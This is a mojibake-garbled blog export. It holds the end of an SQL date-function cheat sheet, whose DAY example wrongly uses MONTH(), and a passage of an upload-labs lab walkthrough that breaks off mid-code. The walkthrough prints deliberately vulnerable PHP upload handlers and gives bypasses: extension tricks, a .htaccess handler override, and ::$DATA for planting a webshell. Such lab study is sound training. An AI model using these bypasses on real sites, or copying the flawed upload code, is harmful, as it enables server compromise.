WEEK(date)\n\nå¯¹äºæ˜ŸæœŸå¤©æ˜¯ä¸€å‘¨çš„ç¬¬ä¸€å¤©çš„åœ°æ–¹ï¼Œæœ‰ä¸€ä¸ªå•ä¸ªå‚æ•°ï¼Œè¿”å›dateçš„å‘¨æ•°ï¼ŒèŒƒå›´åœ¨0åˆ°52ã€‚\n\n```sql\nmysql> select WEEK('1998-02-20');\n-> 7\n```\n\n#### WEEK(date,first)\n\n2ä¸ªå‚æ•°å½¢å¼WEEK()å…è®¸ä½ æŒ‡å®šæ˜ŸæœŸæ˜¯å¦å¼€å§‹äºæ˜ŸæœŸå¤©æˆ–æ˜ŸæœŸä¸€ã€‚  \nå¦‚æœç¬¬äºŒä¸ªå‚æ•°æ˜¯0ï¼Œæ˜ŸæœŸä»æ˜ŸæœŸå¤©å¼€å§‹ï¼Œ  \nå¦‚æœç¬¬äºŒä¸ªå‚æ•°æ˜¯1ï¼Œä»æ˜ŸæœŸä¸€å¼€å§‹ã€‚\n\n```sql\nmysql> select WEEK('1998-02-20',0);\n-> 7\n```\n\n```sql\nmysql> select WEEK('1998-02-20',1);\n-> 8\n```\n\n#### YEAR(date)\n\nè¿”å›dateçš„å¹´ä»½ï¼ŒèŒƒå›´åœ¨1000åˆ°9999ã€‚\n\n```sql\nmysql> select YEAR('98-02-03');\n-> 1998\n```\n\n#### MONTH(date)\n\nè¿”å›dateçš„æœˆä»½ï¼ŒèŒƒå›´1åˆ°12ã€‚\n\n```sql\nmysql> select MONTH('1998-02-03');\n-> 2\n```\n\n#### DAY(date)\n\nè¿”å›dateçš„æœˆä»½ï¼ŒèŒƒå›´1åˆ°31ã€‚\n\n```sql\nmysql> select MONTH('1998-02-03');\n-> 3\n```\n\n#### HOUR(time)\n\nè¿”å›timeçš„å°æ—¶ï¼ŒèŒƒå›´æ˜¯0åˆ°23ã€‚\n\n```sql\nmysql> select HOUR('10:05:03');\n-> 10\n```\n\n#### MINUTE(time)\n\nè¿”å›timeçš„åˆ†é’Ÿï¼ŒèŒƒå›´æ˜¯0åˆ°59ã€‚\n\n```sql\nmysql> select MINUTE('98-02-03 10:05:03');\n-> 5\n```\n\n#### SECOND(time)\n\nå›æ¥timeçš„ç§’æ•°ï¼ŒèŒƒå›´æ˜¯0åˆ°59ã€‚\n\n```sql\nmysql> select SECOND('10:05:03');\n-> 3\n```\n\n#### PERIOD\\_ADD(P,N)\n\nå¢åŠ Nä¸ªæœˆåˆ°é˜¶æ®µP(ä»¥æ ¼å¼YYMMæˆ–YYYYMM)ã€‚ä»¥æ ¼å¼YYYYMMè¿”å›å€¼ã€‚æ³¨æ„é˜¶æ®µå‚æ•°Pä¸æ˜¯æ—¥æœŸå€¼ã€‚\n\n```sql\nmysql> select PERIOD_ADD(9801,2);\n-> 199803\n```\n\n#### PERIOD\\_DIFF(P1,P2)\n\nè¿”å›åœ¨æ—¶æœŸP1å’ŒP2ä¹‹é—´æœˆæ•°ï¼ŒP1å’ŒP2åº”è¯¥ä»¥æ ¼å¼YYMMæˆ–YYYYMMã€‚æ³¨æ„ï¼Œæ—¶æœŸå‚æ•°P1å’ŒP2ä¸æ˜¯æ—¥æœŸå€¼ã€‚\n\n```sql\nmysql> select PERIOD_DIFF(9802,199703);\n-> 11\n```\n\n#### DATE_ADD() \n\nå‘æ—¥æœŸæ·»åŠ æŒ‡å®šçš„æ—¶é—´é—´éš”ã€‚\n\n```sql\nDATE_ADD(date,INTERVAL expr type)\n\n//intervalæ˜¯å›ºå®šæ ‡å¿—ï¼Œexpr è¡¨ç¤ºæ•°é‡ï¼Œå¯ä»¥ä¸ºæ­£è´Ÿï¼Œè¡¨ç¤ºåŠ å‡ï¼Œtypeè¡¨ç¤ºæ—¥æœŸç±»å‹ å¯ä»¥æ˜¯yy,ww,ddç­‰åˆ†åˆ«è¡¨ç¤ºï¼Œå¹´ï¼Œå‘¨ï¼Œå¤©ç­‰\n\n// å¾—åˆ°å½“å‰æ—¶é—´å¢åŠ 1ä¸ªå°æ—¶çš„ç»“æœ\nselect date_add(now(),interval 1 hour)\n\n// å¾—åˆ°å½“å‰æ—¶é—´å¢åŠ 1å¤©çš„ç»“æœ\nselect date_add(now(),interval 1 day)\n\n// å¾—åˆ°å½“å‰æ—¶é—´å‡å°‘72ä¸ªå°æ—¶çš„ç»“æœ\nselect date_add(now(),interval -72 hour)\n\n// è¿˜æœ‰ä¸€äº›æ›´åŠ é«˜çº§çš„ç”¨æ³•ï¼Œæ¯”å¦‚å¢åŠ ä¸€å¤©ä¸€å°æ—¶ä¸€åˆ†ä¸€ç§’\n// ä½†æ˜¯å¦‚æœä½ ä¸å¤ªå–œæ¬¢è¿™ç§ç”¨æ³•ï¼Œä½ ä»ç„¶å¯ä»¥ä½¿ç”¨ç­‰åŒäºè¯¥æ•°å€¼çš„secondæ¥è¿›è¡ŒåŠ å‡\ndate_add(now(),interval '1 1:1:1' day_second)\n```\n\n### JOIN\n\nSQL JOIN ç”¨äºæŠŠæ¥è‡ªä¸¤ä¸ªæˆ–å¤šä¸ªè¡¨çš„è¡Œç»“åˆèµ·æ¥ã€‚\n\nä¸‹å›¾å±•ç¤ºäº† LEFT JOINã€RIGHT JOINã€INNER JOINã€OUTER JOIN ç›¸å…³çš„ 7 ç§ç”¨æ³•ã€‚\n\n![](https://img.jwt1399.top/img/sql-join.png)\n\n\n\n\n\n## â¤ï¸Sponsor\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ°å·§è´¢åŠ›é›„åšï¼Œåˆæ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["MySQL"],"categories":["SQL"]},{"title":"Upload-labså­¦ä¹ ç¬”è®°","url":"/posts/22458.html","content":"![](https://img.jwt1399.top//img/20200824184011.png)\n**upload-labsåŒ…å«æ¼æ´ç±»å‹åˆ†ç±»**\n![](https://i.loli.net/2019/07/10/5d25e308bd36010715.png)\n**å¦‚ä½•åˆ¤æ–­ä¸Šä¼ æ¼æ´ç±»å‹**?\n![](https://i.loli.net/2019/07/10/5d25e308a563a72451.png)\n**ä¸Šä¼ çš„è¿‡ç¨‹**\n![](https://i.loli.net/2019/07/10/5d25e308bcbfc88081.png)\n\n## Pass-01ï¼ˆå‰ç«¯JSç»•è¿‡ï¼‰\n```php\nfunction checkFile() {\n    var file = document.getElementsByName('upload_file')[0].value;\n    if (file == null || file == \"\") {\n        alert(\"è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!\");\n        return false;\n    }\n    //å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹\n    var allow_ext = \".jpg|.png|.gif\";\n    //æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹\n    var ext_name = file.substring(file.lastIndexOf(\".\"));\n    //åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ \n    if (allow_ext.indexOf(ext_name + \"|\") == -1) {\n        var errMsg = \"è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ \" + allow_ext + \"ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š\" + ext_name;\n        alert(errMsg);\n        return false;\n    }\n}\n```\n**æ–¹æ³•ä¸€**ï¼šå‰ç«¯æ£€æµ‹ã€‚jsçš„æ£€æµ‹åªèƒ½ä½äºclientï¼Œå¯ä»¥ç¦ç”¨js,åœ¨æµè§ˆå™¨è®¾ç½®ä¸­ä¿®æ”¹ã€‚æˆ–è€…ç›´æ¥æ”¹æ‰è¿™é‡Œçš„ `checkFile()`\n![](https://i.loli.net/2019/07/10/5d25e3089bf2484973.png)\nä¿®æ”¹ä¹‹åå°±å¯ä»¥ç›´æ¥ä¸Šä¼ .phpæ–‡ä»¶,ä¸Šä¼ ä¹‹åå¤åˆ¶å›¾åƒåœ°å€å°±å¯ä»¥å¾—åˆ°ä¸Šä¼ è·¯å¾„äº†\n![](https://i.loli.net/2019/07/10/5d259e89e70f481855.png)\n![](https://i.loli.net/2019/07/10/5d259eeca0ff482219.png)\n**æ–¹æ³•äºŒ**ï¼šä¸Šä¼ 1.pngç›´æ¥æŠ“åŒ…ï¼Œä¿®æ”¹åç¼€ä¸ºphpå°±å¯ä»¥ç»•è¿‡ä¸Šä¼ \n![](https://i.loli.net/2019/07/10/5d25921a1fa3871606.png)\nå¾—åˆ°è·¯å¾„/upload/1.php,è¿æ¥èœåˆ€ï¼Œå¾—åˆ°shell\n![](https://i.loli.net/2019/07/10/5d259e89e762113980.png)\n## Pass-02ï¼ˆMIMEç»•è¿‡ï¼‰\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            \n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';\n            }\n        } else {\n            $msg = 'æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼';\n        }\n    } else {\n        $msg = UPLOAD_PATH.'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';\n    }\n}\n```\næœ¬èŠ‚å¯¹æ•°æ®åŒ…çš„MIMEï¼ˆcontent-typeï¼‰è¿›è¡Œäº†é™å®šï¼Œåªå…è®¸ image/jpegã€image/pngã€image/gif å›¾ç‰‡å†…å®¹æ•°æ®ä¼ è¾“ã€‚æ“ä½œå’Œç¬¬ä¸€èŠ‚æ–¹æ³•äºŒä¸€æ ·ã€‚\n\nä¸Šä¼ 1.pngç›´æ¥æŠ“åŒ…ï¼Œä¿®æ”¹åç¼€ä¸ºphpå°±å¯ä»¥ç»•è¿‡ä¸Šä¼ \n![](https://i.loli.net/2019/07/10/5d25921a1fa3871606.png)\nå¾—åˆ°è·¯å¾„/upload/1.php,è¿æ¥èœåˆ€ï¼Œå¾—åˆ°shell\n![](https://i.loli.net/2019/07/10/5d259e89e762113980.png)\n\n## Pass-03ï¼ˆç‰¹æ®Šå¯è§£æåç¼€ç»•è¿‡php4/phtmlï¼‰\n\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array('.asp','.aspx','.php','.jsp');\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA\n        $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º\n\n        if(!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;            \n            if (move_uploaded_file($temp_file,$img_path)) {\n                 $is_upload = true;\n            } else {\n                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';\n            }\n        } else {\n            $msg = 'ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼';\n        }\n    } else {\n        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';\n    }\n}\n```\n\næŸ¥çœ‹æºç ï¼Œå‘ç°æ˜¯è®¾ç½®äº†æ–‡ä»¶åç¼€åé»‘åå•ï¼Œç¦æ­¢ä¸Šä¼ åç¼€åä¸º.phpæ–‡ä»¶ï¼Œè¿™é‡Œåˆ©ç”¨php2ã€php3ã€php4ã€php5ã€phpsã€phtmlä¸€æ ·ä¼šè§£æï¼Œç›´æ¥ä¿®æ”¹åç¼€åä¸ºphpsä¸Šä¼ ã€‚\nå¤åˆ¶å›¾åƒåœ°å€\n![](https://i.loli.net/2019/07/10/5d25a447e8e7e46472.png)\nå¾—åˆ°ä¸Šä¼ è·¯å¾„\n![](https://i.loli.net/2019/07/10/5d25a3f3b012145109.png)\n**å¸¸è§æ‰©å±•åç»•è¿‡**ï¼š\n\n```\nasp:asa,cer,cdx\naspx:ashx,asmx,ascx\nphp:php2ã€php3ã€php4ã€php5ã€phpsã€phtml\njsp:jspx,jspf\n```\n## Pass-04ï¼ˆä¸Šä¼  .htaccessï¼‰\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\"php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\"pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA\n        $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º\n\n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';\n            }\n        } else {\n            $msg = 'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !';\n        }\n    } else {\n        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';\n    }\n}\n```\næ¯”åˆšæ‰çš„é»‘åå•å¤šäº†ä¸å°‘ï¼Œä½†æ˜¯.htaccessè¿˜æ˜¯æ²¡æœ‰è¿‡æ»¤ï¼Œå¯ä»¥`é‡å†™æ–‡ä»¶è§£æè§„åˆ™`ç»•è¿‡ï¼Œä¸Šä¼ ä¸€ä¸ª`.htaccess`ï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼Œæ„æ€å°±æ˜¯åœ¨uploadç›®å½•ä¸‹åŒ¹é…1.jpgçš„æ–‡ä»¶å¹¶ä»¥phpæ–‡ä»¶æ‰§è¡Œ\n```php\n<FilesMatch \"1.jpg\">\nSetHandler application/x-httpd-php\n</FilesMatch>\t\n```\nä¸Šä¼ ä¸€ä¸ª`.htaccess`\n![](https://i.loli.net/2019/07/10/5d25ad7b5ee8e39892.png)\nä¸Šä¼ `1.jpg`,åº”ä¸ºé‡å†™äº†æ–‡ä»¶è§£æè§„åˆ™ï¼Œ1.jpgå°†ä¼šè¢«ä»¥phpæ–‡ä»¶æ‰§è¡Œ\n![](https://i.loli.net/2019/07/10/5d25b04b0258016333.png)\nç„¶åç›´æ¥è¿æ¥èœåˆ€\n![](https://i.loli.net/2019/07/10/5d25b1ad8c6b176191.png)\ngetshell\n![](https://i.loli.net/2019/07/10/5d25b1639408c69941.png)\n**.htaccessæ”»å‡»æ€»ç»“**\næœ‰çš„æ—¶å€™ç”±äºå„ç§åå•çš„åŸå› ï¼Œå¯èƒ½æˆ‘ä»¬ä¸èƒ½ä¸Šä¼ ä»»ä½•phpæ–‡ä»¶ï¼Œè€Œä¸”è¿˜æ²¡æœ‰å…¶ä»–åœ°æ–¹æ¥è§£ææˆphpï¼Œå’‹åŠï¼Ÿå¦‚æœä½ èƒ½ä¸Šä¼ .htaccessæ–‡ä»¶çš„è¯ï¼Œé‚£ä¹ˆå°±å¾ˆå¥½åŠäº†ã€‚\nå»ºä¸€ä¸ª.htaccess æ–‡ä»¶ï¼Œé‡Œé¢çš„å†…å®¹å¦‚ä¸‹\n```php\n<FilesMatch \"1.jpg\">\nSetHandler application/x-httpd-php\n</FilesMatch>\n```\nè¿™ä¸ªæ—¶å€™å°±ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶åå­—æ˜¯1.jpgçš„æ–‡ä»¶ï¼Œç„¶åé‡Œé¢æ˜¯ä¸€å¥è¯æœ¨é©¬ï¼Œ1.jpgå°±ä¼šè¢«å½“æˆ1.phpæ‰§è¡Œï¼Œå°±èƒ½æˆåŠŸè¿æ¥èœåˆ€\n\n## Pass-05ï¼ˆåç¼€å¤§å°å†™ç»•è¿‡ï¼‰\n\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA\n        $file_ext = trim($file_ext); //é¦–å°¾å»ç©º\n\n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';\n            }\n        } else {\n            $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼';\n        }\n    } else {\n        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';\n    }\n}\n```\n**Pass-04ä¸Pass-05ä»£ç å¯¹æ¯”**\n![](https://i.loli.net/2019/07/10/5d25e308c1cf337348.png)\nå¯¹æ¯”ä¹‹åå‘ç°é»‘åå•å¤šäº†ä¸€ä¸ª`.htaccess`\nå¹¶ä¸”æ²¡æœ‰å°†æ–‡ä»¶åç¼€è½¬å°å†™çš„ä»£ç äº†\näºæ˜¯è¿™é‡Œæ˜¾ç„¶å¯ä»¥ç”¨å¤§å°å†™ç»•è¿‡ï¼Œä¾‹å¦‚ .Php .phP\n![](https://i.loli.net/2019/07/11/5d2697927638a47192.png)\n\n## Pass-06ï¼ˆåç¼€æœ«å°¾ åŠ ç©ºæ ¼ ç»•è¿‡ï¼‰\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\");\n        $file_name = $_FILES['upload_file']['name'];\n        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA\n        \n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;\n            if (move_uploaded_file($temp_file,$img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';\n            }\n        } else {\n            $msg = 'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ';\n        }\n    } else {\n        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';\n    }\n}\n```\n**Pass-05ä¸Pass-06ä»£ç å¯¹æ¯”**\n![](https://i.loli.net/2019/07/10/5d25eb9e76b1292828.png)\nå‘ç°åˆ å»äº†å°†æ–‡ä»¶åå‰åå»ç©ºæ ¼çš„æ“ä½œ æ‰€ä»¥å¯ä»¥åˆ©ç”¨`6.php(ç©ºæ ¼)`\n![](https://i.loli.net/2019/07/11/5d2696f2bc32834852.png)\n## Pass-07ï¼ˆåç¼€æœ«å°¾ åŠ ç‚¹ ç»•è¿‡ï¼‰\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA\n        $file_ext = trim($file_ext); //é¦–å°¾å»ç©º\n        \n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';\n            }\n        } else {\n            $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼';\n        }\n    } else {\n        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';\n    }\n}\n```\n**Pass-06ä¸Pass-07ä»£ç å¯¹æ¯”**\n![](https://i.loli.net/2019/07/11/5d268d5ff024a68329.png)\nå¯¹æ¯”å‘ç°æ²¡æœ‰å»å¤„æ–‡ä»¶æœ«å°¾çš„ç‚¹çš„æ“ä½œäº†\näºæ˜¯åˆ©ç”¨`7.php.`\n![](https://i.loli.net/2019/07/11/5d268e891711188220.png)\n## Pass-08ï¼ˆ ::$DATA ç»•è¿‡ ï¼‰\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™\n        $file_ext = trim($file_ext); //é¦–å°¾å»ç©º\n        \n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';\n            }\n        } else {\n            $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼';\n        }\n    } else {\n        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';\n    }\n}\n```\n**Pass-07ä¸Pass-08ä»£ç å¯¹æ¯”**\n![](https://i.loli.net/2019/07/11/5d269874eb86289062.png)\nå¯¹æ¯”å‘ç°è¿™é‡Œåˆ æ‰äº†` ::$DATA`çš„é™åˆ¶\n`::$DATAå¤‡ç”¨æµ`å­˜åœ¨äºæ¯ä¸ªæ–‡ä»¶ï¼Œå› æ­¤å®ƒå¯ä»¥æ˜¯è®¿é—®ä»»ä½•æ–‡ä»¶çš„æ›¿ä»£æ–¹æ³•\næ‰€ä»¥ä½¿ç”¨`8.php::$DATA`\n![](https://i.loli.net/2019/07/11/5d269c8c2007e67852.png)\n**Windows :: DATAå¤‡ç”¨æ•°æ®æµæ¼æ´ï¼š**\nhttps://www.owasp.org/index.php/Windows_::DATA_alternate_data_stream\n## Pass-09ï¼ˆç‚¹å’Œç©ºæ ¼é…åˆç»•è¿‡ï¼‰\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA\n        $file_ext = trim($file_ext); 